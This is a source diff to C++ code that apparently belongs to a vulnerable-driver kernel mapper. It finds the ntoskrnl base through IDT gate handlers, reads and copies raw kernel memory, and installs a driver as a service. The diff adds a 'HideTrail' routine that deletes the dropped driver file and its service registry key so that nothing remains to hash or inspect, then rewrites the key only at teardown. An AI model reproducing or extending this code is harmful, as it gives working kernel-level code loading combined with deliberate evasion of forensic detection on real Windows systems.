@@ -302,12 +302,44 @@ namespace nal
 
         __sidt(&idtr);
 
-        if (idtr.base < 0xFFFF800000000000ULL)
+        /*
+         * Do NOT require a kernel-range base here. In user mode SIDT returns the
+         * KUSER_SHARED_DATA shadow (~0xFFFFF78000000000), so a kernel-range test
+         * rejects the one route that does not depend on the module list before it
+         * does anything. Only the handler address has to be a kernel address.
+         */
+        km_log::Line("*", "idt limit 0x%X base 0x%llX", idtr.limit,
+                     (unsigned long long)idtr.base);
+
+        if (!idtr.base)
             return 0;
 
-        km_log::Line("*", "idt base 0x%llX", idtr.base);
+        /*
+         * In user mode SIDT hands back the KUSER_SHARED_DATA shadow of the IDT,
+         * not the real table, so idtr.base sits nowhere near ntoskrnl and scanning
+         * outwards from it finds nothing. The shadow still carries the real gate
+         * descriptors though, and their handler addresses point straight into
+         * ntoskrnl - that is the anchor the scan needs.
+         */
+        uint8_t gate[16] = { 0 };
 
-        const uint64_t anchor = idtr.base & ~0xFFFULL;
+        if (!ReadMemory(idtr.base, gate, sizeof(gate)))
+        {
+            km_log::Warn("IDT shadow unreadable at 0x%llX", (unsigned long long)idtr.base);
+            return 0;
+        }
+
+        const uint64_t handler = (uint64_t)gate[0] | ((uint64_t)gate[1] << 8) |
+                                 ((uint64_t)gate[6] << 16) | ((uint64_t)gate[7] << 24) |
+                                 ((uint64_t)gate[8] << 32) | ((uint64_t)gate[9] << 40) |
+                                 ((uint64_t)gate[10] << 48) | ((uint64_t)gate[11] << 56);
+
+        if (handler < 0xFFFF800000000000ULL)
+            return 0;
+
+        km_log::Line("*", "idt handler 0x%llX", handler);
+
+        const uint64_t anchor = handler & ~0xFFFULL;
         uint8_t page[0x1000];
 
         for (int direction = 0; direction < 2; ++direction)
@@ -538,12 +570,16 @@ namespace nal
             return false;
         }
 
+        /*
+         * A missing kernel base is NOT fatal here. Unmapping needs only the
+         * driver object, an explicit DriverUnload address and raw memory reads -
+         * none of which go through export resolution. Mapping does, and refuses
+         * on its own. Treating it as fatal meant a corrupt PsLoadedModuleList
+         * blocked the one operation that could repair it, so recovery needed a
+         * reboot.
+         */
         if (!EnsureKernelBase())
-        {
-            CloseHandle(hDevice);
-            hDevice = INVALID_HANDLE_VALUE;
-            return false;
-        }
+            km_log::Warn("kernel base unresolved - unload still works, mapping will not");
 
         return true;
     }
@@ -723,6 +759,14 @@ namespace nal
 
         if (!g_serviceName.empty())
         {
+            /*
+             * HideTrail deleted the key, so it has to exist again before
+             * NtUnloadDriver can name the service by it. Rebuilt from the same
+             * values, so it is identical to the one that was removed.
+             */
+            if (g_ownedService && !g_driverPath.empty())
+                service::WriteKey(g_driverPath, g_serviceName);
+
             service::StopAndRemove(g_serviceName);
             g_serviceName.clear();
         }
@@ -755,6 +799,36 @@ namespace nal
 
         ntoskrnlBase = 0;
         return true;
+    }
+
+    void HideTrail()
+    {
+        if (g_driverPath.empty())
+            return;
+
+        /*
+         * The image section holds its own reference to the file, so the driver
+         * keeps running and unloading still works. Only the directory entry goes.
+         * The path string is deliberately kept: the trace scrub keys off the file
+         * name, and the release path removes the file again (harmlessly).
+         */
+        if (_wremove(g_driverPath.c_str()) == 0)
+            km_log::Step("dropped host image removed - nothing left on disk to hash");
+        else
+            km_log::Warn("could not remove %ls - the file stays on disk", g_driverPath.c_str());
+
+        /*
+         * The service key is an independent trail: it names the random driver and
+         * its %TEMP% ImagePath, and it outlives the session unless removed here.
+         * NtUnloadDriver needs a key to name the service by, so teardown writes it
+         * back from the same values instead of leaving it for the whole session.
+         *
+         * Owned service only - an adopted key belongs to whatever still holds the
+         * device.
+         */
+        if (g_ownedService && !g_serviceName.empty() &&
+            NT_SUCCESS(service::RemoveKey(g_serviceName)))
+            km_log::Step("service key removed - the registry holds nothing while the session runs");
     }
 
     bool MemCopy(uint64_t destination, uint64_t source, uint64_t size)
